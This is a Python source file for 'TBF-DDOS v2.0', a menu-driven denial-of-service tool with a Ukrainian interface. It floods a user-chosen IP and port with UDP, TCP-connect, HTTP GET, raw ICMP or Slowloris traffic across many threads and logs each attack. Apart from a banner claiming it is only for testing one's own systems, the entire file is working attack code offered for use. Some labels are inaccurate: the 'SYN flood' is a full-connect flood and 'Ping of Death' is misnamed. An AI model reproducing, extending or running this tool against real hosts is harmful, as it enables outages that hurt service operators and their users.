#!/usr/bin/env python3
# ============================================
#   TBF-DDOS v2.0
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

import socket
import random
import threading
import time
import os
import sys
import struct
import logging

# Кольори
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Налаштування логування
logging.basicConfig(filename='tbf_ddos.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

def clear():
    os.system('clear')

def banner():
    print(f"""{RED}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ████████╗██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗███████╗
║   ╚══██╔══╝██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝
║      ██║   ██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║   █████╗  
║      ██║   ██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║   ██╔══╝  
║      ██║   ██████╔╝██║         ██║ ╚████║╚██████╔╝   ██║   ███████╗
║      ╚═╝   ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝
║                                                                  ║
║        ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗            ║
║        ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝██║  ██║            ║
║        ██████╔╝██████╔╝██║   ██║    ███████╗███████║            ║
║        ██╔═══╝ ██╔══██╗██║   ██║    ╚════██║██╔══██║            ║
║        ██║     ██║  ██║╚██████╔╝    ███████║██║  ██║            ║
║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝            ║
║                                                                  ║
║                ██╗  ██╗██████╗ ██████╗  ██████╗                 ║
║                ██║  ██║██╔══██╗██╔══██╗██╔═══██╗                ║
║                ███████║██████╔╝██████╔╝██║   ██║                ║
║                ██╔══██║██╔═══╝ ██╔══██╗██║   ██║                ║
║                ██║  ██║██║     ██║  ██║╚██████╔╝                ║
║                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝                 ║
║                                                                  ║
║                     TBFPUMBA — TECHNOLOGY. SECURITY. EFFICIENCY  ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{PURPLE}🔥 TBF-DDOS v2.0 — 5 типів атак 🔥{RESET}                           {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}⚠️  ТІЛЬКИ ДЛЯ ТЕСТУВАННЯ ВЛАСНИХ СИСТЕМ! ⚠️{RESET}       {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def log_attack(target_ip, target_port, attack_type, duration, threads):
    logging.info(f"Атака: {attack_type} | IP: {target_ip} | Порт: {target_port} | Тривалість: {duration}с | Потоки: {threads}")

def udp_flood(target_ip, target_port, duration, threads):
    def flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                data = random._urandom(1024)
                sock.sendto(data, (target_ip, target_port))
            except:
                pass
    
    log_attack(target_ip, target_port, "UDP Flood", duration, threads)
    print(f"{GREEN}🔓 Запуск UDP-флуду на {target_ip}:{target_port}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration}с | 🧵 Потоки: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ UDP-атаку завершено!{RESET}")

def syn_flood(target_ip, target_port, duration, threads):
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.close()
            except:
                pass
    
    log_attack(target_ip, target_port, "SYN Flood", duration, threads)
    print(f"{GREEN}🔓 Запуск SYN-флуду на {target_ip}:{target_port}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration}с | 🧵 Потоки: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ SYN-атаку завершено!{RESET}")

def http_flood(target_ip, target_port, duration, threads):
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                sock.close()
            except:
                pass
    
    log_attack(target_ip, target_port, "HTTP Flood", duration, threads)
    print(f"{GREEN}🔓 Запуск HTTP-флуду на {target_ip}:{target_port}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration}с | 🧵 Потоки: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ HTTP-атаку завершено!{RESET}")

def icmp_flood(target_ip, duration, threads):
    # Перевірка прав для ICMP (потрібен root)
    if os.geteuid() != 0:
        print(f"{RED}❌ ICMP-атака потребує root-прав! Запустіть з sudo або як root.{RESET}")
        return
    
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + random._urandom(56)
                sock.sendto(packet, (target_ip, 0))
            except:
                pass
    
    log_attack(target_ip, 0, "ICMP Flood", duration, threads)
    print(f"{GREEN}🔓 Запуск ICMP-флуду (Ping of Death) на {target_ip}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration}с | 🧵 Потоки: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ ICMP-атаку завершено!{RESET}")

def slowloris(target_ip, target_port, duration, threads):
    def flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # ← Таймаут для уникнення зависання
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            while True:
                try:
                    sock.send(b"X-Header: keep-alive\r\n")
                    time.sleep(10)
                except:
                    break
        except:
            pass
    
    log_attack(target_ip, target_port, "Slowloris", duration, threads)
    print(f"{GREEN}🔓 Запуск Slowloris на {target_ip}:{target_port}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration}с | 🧵 Потоки: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ Slowloris завершено!{RESET}")

def show_menu():
    clear()
    banner()
    print(f"{GREEN}📂 Виберіть тип атаки:{RESET}")
    print(f"  {YELLOW}1.{RESET} 📡 UDP Flood")
    print(f"  {YELLOW}2.{RESET} 🔄 TCP SYN Flood")
    print(f"  {YELLOW}3.{RESET} 🌐 HTTP Flood")
    print(f"  {YELLOW}4.{RESET} 📦 ICMP Flood (Ping of Death)")
    print(f"  {YELLOW}5.{RESET} 🐌 Slowloris (повільна атака)")
    print(f"  {YELLOW}6.{RESET} ❌ Вихід")
    print()
    return input("👉 Виберіть (1-6): ")

def main():
    while True:
        choice = show_menu()
        if choice in ["1", "2", "3", "4", "5"]:
            target_ip = input(f"{GREEN}📝 Введіть IP-адресу цілі: {RESET}")
            target_port = 0
            if choice != "4":
                target_port = int(input(f"{GREEN}📝 Введіть порт (наприклад, 80): {RESET}"))
            duration = int(input(f"{GREEN}📝 Введіть тривалість (секунди): {RESET}"))
            threads = int(input(f"{GREEN}📝 Введіть кількість потоків (наприклад, 50): {RESET}"))
            
            clear()
            banner()
            
            if choice == "1":
                udp_flood(target_ip, target_port, duration, threads)
            elif choice == "2":
                syn_flood(target_ip, target_port, duration, threads)
            elif choice == "3":
                http_flood(target_ip, target_port, duration, threads)
            elif choice == "4":
                icmp_flood(target_ip, duration, threads)
            elif choice == "5":
                slowloris(target_ip, target_port, duration, threads)
            
            input("\nНатисніть Enter...")
        elif choice == "6":
            clear()
            banner()
            print(f"{GREEN}👋 Дякуємо, що використовуєте TBF-DDOS!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}❌ Невірний вибір.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
